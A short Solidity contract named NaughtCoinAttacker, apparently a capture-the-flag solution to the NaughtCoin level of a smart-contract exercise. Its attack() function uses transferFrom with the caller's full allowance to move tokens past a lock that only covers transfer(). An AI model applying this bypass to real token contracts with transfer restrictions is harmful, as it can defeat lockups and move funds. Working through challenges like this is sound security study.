// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "./NaughtCoin.sol";

contract NaughtCoinAttacker {
    error NaughtCoinAttacker__InsufficientAllowance();

    IERC20 public immutable s_naughtCoin;

    constructor(address _naughtCoin) {
        s_naughtCoin = IERC20(_naughtCoin);
    }

    function attack() public {
        uint256 amount = s_naughtCoin.balanceOf(msg.sender);
        uint256 allowance = s_naughtCoin.allowance(msg.sender, address(this));
        if (allowance > 0 && amount == allowance) {
            s_naughtCoin.transferFrom(msg.sender, address(this), amount);
        } else {
            revert NaughtCoinAttacker__InsufficientAllowance();
        }
    }
}

